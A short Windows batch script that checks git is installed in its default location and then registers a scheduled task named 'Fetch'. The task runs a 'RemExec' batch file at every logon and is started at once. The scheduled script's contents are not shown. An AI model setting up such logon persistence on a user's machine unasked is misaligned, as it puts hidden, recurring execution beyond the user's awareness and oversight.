@echo off
for /F "tokens=*" %%g IN ('where git') do (SET git=%%g)
if "%git%"=="C:\Program Files\Git\cmd\git.exe" (
   goto create
) else (
   start /WAIT abort.vbs
   exit
)

:create
schtasks /Create /TR "%localappdata%\Programs\RemExec\task.bat" /RU %USERNAME% /TN Fetch /SC ONLOGON /f
schtasks /Run /TN "Fetch"
exit